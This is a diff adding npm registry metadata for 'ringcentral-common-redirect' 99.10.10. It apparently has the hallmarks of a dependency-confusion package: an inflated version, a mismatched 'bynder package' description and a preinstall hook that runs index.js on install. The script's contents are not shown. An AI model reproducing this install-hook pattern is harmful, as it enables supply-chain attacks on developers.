@@ -1,0 +1,62 @@
+{
+    "_id": "ringcentral-common-redirect",
+    "name": "ringcentral-common-redirect",
+    "dist-tags": {
+        "latest": "99.10.10"
+    },
+    "versions": {
+        "99.10.10": {
+            "name": "ringcentral-common-redirect",
+            "version": "99.10.10",
+            "description": "bynder package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "ringcentral-common-redirect@99.10.10",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-t0IWVa7s0hq1geLJK4VfOINmoV09EIQDtTNo5bF1OkyNsbMmumXz4ZjDKimyzxPrZGgcJynKaGYMAO3NM+/+eA==",
+                "shasum": "b225972a231b24cbbc731ba08e9fd1b0a21c101d",
+                "tarball": "https://registry.npmjs.org/ringcentral-common-redirect/-/ringcentral-common-redirect-99.10.10.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5078,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiMix4ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmr40RAAnRFnlnGZ4vcKR8cvVtnRFr1umZFnsoDkj39H1DZNwtxvDL9J\r\n5gSwzJRCeVjG9cCEkaIqdYidOLCUS5R4PJ3fAJMXesDsxCb0rv2YyXz1gzFU\r\nhzqKvxhFN575EPk/hlNpbvIRXBc60AWZ5YXyqOWs/YUFqdVHKTxaJVRBa5KR\r\nge1xzTrI4emnkGINcNqhuIjQuAwfKodPYaWF0bhyGWSVSgpG6r3e3BhEm/f7\r\njgriEBHPoqaV0vLIQLZIImzRQ0wxrUPVlBV8HPvLlI/xYqLu4Z+eydNZgzJq\r\nFSLZWYQn12gtaXMzmMacXD/0NXXQeK+U7XSU9gCJZKg0vxznR+yKbaYoMU7n\r\ng7MphI4fBkqg6d+10HcRAOAJaxw/Tz0fWzp0d3NM3VOpBOZnJqwvtRKWHqZy\r\nWk/roCtr2HjvPhyl72RjUYs7cO4ZqVhj+nzyigW1pGpjXTC0ymdZ1/xIIO1E\r\n/p5IBadRse4ZmRXDhUENrl1raAW8wIkeCEBUgklWQq5+CyH10irqBH2SNPjU\r\nTUK+r6ycieGIUJrfT7v5CHrpSfytrfSL1ihkwQ4X4EVfswzTcntCdY4yZHO+\r\naXlhCuje4fwe4hvFFqt+j1kDmHwPtG3/c/SREvUonc4ULiBrLQe5yDfVOUnp\r\nRorjLWTBgaqCbkCpCqW3z25ZikGfU9qgIvM=\r\n=nh9i\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "deribit_api",
+                "email": "deribit_api@rt11.33mail.com"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "deribit_api",
+                    "email": "deribit_api@rt11.33mail.com"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/ringcentral-common-redirect_99.10.10_1647455352841_0.6112054939841769"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-16T18:29:12.841Z",
+        "99.10.10": "2022-03-16T18:29:12.990Z",
+        "modified": "2022-03-16T18:29:13.099Z"
+    },
+    "maintainers": [
+        {
+            "name": "deribit_api",
+            "email": "deribit_api@rt11.33mail.com"
+        }
+    ],
+    "description": "bynder package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
